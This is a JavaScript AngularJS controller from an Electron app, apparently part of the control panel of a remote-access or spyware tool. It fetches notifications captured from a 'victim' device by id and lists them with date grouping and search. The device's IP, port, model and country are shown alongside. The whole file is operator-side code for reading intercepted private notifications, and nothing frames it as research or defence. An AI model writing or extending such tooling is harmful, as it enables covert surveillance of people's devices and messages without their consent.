const { remote } = require('electron');
const { ipcRenderer } = require('electron');
const fs = require('fs');
// NO declares el módulo aquí, solo usa el existente
// var app = angular.module('myappy', []);

var victim = remote.getCurrentWebContents().victim;

angular.module('myappy').controller("NotifiCtrl", function($scope, $http) {
    // Datos del dispositivo víctima
    $scope.victimSocket = victim.ip + ":" + victim.port;
    $scope.victimModel = victim.model;
    $scope.victimCountry = victim.country;
    $scope.victim = (victim && victim.id) ? victim.id :
                    ((victim.ip && victim.port) ? (victim.ip + ":" + victim.port) : "");

    $scope.notifications = [];
    $scope.dateGroups = [];
    $scope.loading = false;
    $scope.searchQuery = "";
    $scope.filteredCount = 0;

    var DATE_LABELS = { TODAY: 'Hoy', YESTERDAY: 'Ayer', EARLIER: 'Anteriores' };

    function getDateLabel(timeStr) {
        var now = new Date();
        var d = new Date(timeStr);
        if (isNaN(d)) return DATE_LABELS.EARLIER;
        var yesterday = new Date(now);
        yesterday.setDate(yesterday.getDate() - 1);
        if (d.toDateString() === now.toDateString()) return DATE_LABELS.TODAY;
        if (d.toDateString() === yesterday.toDateString()) return DATE_LABELS.YESTERDAY;
        return DATE_LABELS.EARLIER;
    }

    function buildDateGroups(notifs) {
        var order = [DATE_LABELS.TODAY, DATE_LABELS.YESTERDAY, DATE_LABELS.EARLIER];
        var map = {};
        order.forEach(function(lbl) { map[lbl] = []; });
        notifs.forEach(function(n) {
            var lbl = getDateLabel(n.time);
            map[lbl].push(n);
        });
        return order.map(function(lbl) {
            return { label: lbl, notifications: map[lbl] };
        });
    }

    $scope.matchesSearch = function(notif) {
        var q = ($scope.searchQuery || '').toLowerCase().trim();
        if (!q) return true;
        var title = (notif.title || '').toLowerCase();
        var content = (notif.content || '').toLowerCase();
        return title.indexOf(q) !== -1 || content.indexOf(q) !== -1;
    };

    function updateFilteredCount() {
        var count = 0;
        $scope.notifications.forEach(function(n) {
            if ($scope.matchesSearch(n)) count++;
        });
        $scope.filteredCount = count;
    }

    $scope.$watch('searchQuery', function() {
        updateFilteredCount();
    });

    $scope.loadNotifications = function() {
        const victimId = String($scope.victim).trim();
        $scope.loading = true;
        $http.get('/api/notifications/' + victimId)
          .then(function(response) {
            var raw = (response.data || []).slice().sort(function(a, b) {
                return new Date(b.time) - new Date(a.time);
            });
            $scope.notifications = raw;
            $scope.dateGroups = buildDateGroups(raw);
            updateFilteredCount();
            $scope.loading = false;
          }, function() {
            $scope.notifications = [];
            $scope.dateGroups = [];
            $scope.filteredCount = 0;
            $scope.loading = false;
          });
    };

    // Carga inicial
    $scope.loadNotifications();
});